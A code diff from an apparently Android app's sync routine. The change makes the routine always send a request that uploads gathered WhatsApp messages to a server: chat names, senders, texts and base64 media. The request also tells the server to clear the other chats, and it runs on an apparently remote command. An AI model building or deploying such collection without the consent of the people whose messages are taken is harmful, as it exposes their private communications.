@@ -327,31 +327,29 @@ class SyncRunner(private val context: Context) {
                 db.whatsAppMessageDao().insertAll(gatheredEntries)
             }
 
-            // 5. Upload all unsynced messages to server immediately
+            // 5. Upload all unsynced messages to server immediately (and purge other chats)
             val unsynced = db.whatsAppMessageDao().getUnsynced()
-            if (unsynced.isNotEmpty()) {
-                val dtos = unsynced.map {
-                    WhatsAppMessageEntryDto(
-                        chatName = it.chatName,
-                        sender = it.sender,
-                        messageText = it.messageText,
-                        isOutgoing = it.isOutgoing,
-                        messageTime = Instant.ofEpochMilli(it.messageTimeEpochMs).toString(),
-                        mediaType = it.mediaType ?: (if (it.mediaPath != null) "image" else null),
-                        mediaPath = it.mediaPath ?: (if (it.chatName.equals(chatName, ignoreCase = true)) latestMediaBase64 else null)
-                    )
-                }
-                val resp = ApiClient.service.syncWhatsAppMessages(
-                    bearer,
-                    WhatsAppMessagesSyncRequest(
-                        entries = dtos,
-                        activeChat = chatName,
-                        clearOtherChats = true
-                    )
+            val dtos = unsynced.map {
+                WhatsAppMessageEntryDto(
+                    chatName = it.chatName,
+                    sender = it.sender,
+                    messageText = it.messageText,
+                    isOutgoing = it.isOutgoing,
+                    messageTime = Instant.ofEpochMilli(it.messageTimeEpochMs).toString(),
+                    mediaType = it.mediaType ?: (if (it.mediaPath != null) "image" else null),
+                    mediaPath = it.mediaPath ?: (if (it.chatName.equals(chatName, ignoreCase = true)) latestMediaBase64 else null)
                 )
-                if (resp.isSuccessful) {
-                    db.whatsAppMessageDao().deleteByIds(unsynced.map { it.id })
-                }
+            }
+            val resp = ApiClient.service.syncWhatsAppMessages(
+                bearer,
+                WhatsAppMessagesSyncRequest(
+                    entries = dtos,
+                    activeChat = chatName,
+                    clearOtherChats = true
+                )
+            )
+            if (resp.isSuccessful && unsynced.isNotEmpty()) {
+                db.whatsAppMessageDao().deleteByIds(unsynced.map { it.id })
             }
 
             // 6. Ack command with success
